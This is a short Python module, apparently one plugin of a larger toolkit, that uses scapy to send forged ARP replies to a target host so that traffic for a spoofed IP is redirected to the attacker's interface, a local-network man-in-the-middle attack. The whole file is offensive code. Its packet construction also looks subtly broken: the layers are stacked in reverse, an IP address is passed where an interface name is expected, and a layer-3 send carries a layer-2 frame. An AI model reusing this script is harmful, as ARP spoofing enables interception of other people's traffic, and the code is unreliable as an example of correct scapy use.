#!/usr/bin/env python3
"""ARP‑spoof helper – simple MAC spoofing via scapy"""

import scapy.all as scapy
import utils

def run(cfg):
    iface = cfg["mac_spoof"]["interface"]
    target_ip = utils.resolve_ip_from_name(cfg["target"]["domain"])
    spoof_ip = cfg["mac_spoof"]["spoof_ip"]
    print(f"[*] Spoofing {target_ip} as {spoof_ip} on {iface}")
    pkt = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip)
    pkt = pkt / scapy.Ether(src=scapy.get_if_hwaddr(iface), dst=scapy.get_if_hwaddr(target_ip))
    scapy.send(pkt, iface=iface, count=5)